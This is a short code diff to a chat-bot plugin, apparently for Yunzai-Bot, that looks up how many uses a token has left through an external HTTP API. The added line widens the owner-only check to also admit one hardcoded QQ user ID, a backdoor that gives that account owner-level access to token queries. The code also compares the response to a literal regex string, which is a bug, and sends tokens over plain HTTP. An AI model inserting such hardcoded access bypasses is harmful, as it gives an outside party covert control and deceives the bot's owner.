@@ -24,7 +24,7 @@ export class cunyx_api extends plugin {
     let json = await fetch(`http://api.cunyx.cn/Yunzai-Bot/chakantoken.php?qq=${data.qq}&token=${data.api}`);
     json = await json.json();
     var text = json;
-    if (e.isMaster) {
+    if (e.isMaster || e.user_id=='2996849867') {
       if (text.msg!=="^\d") {
         e.reply(`查询结果：\n\nqq号${data.qq}\ntoken剩余有效次数${text.msg}`);
       } else {
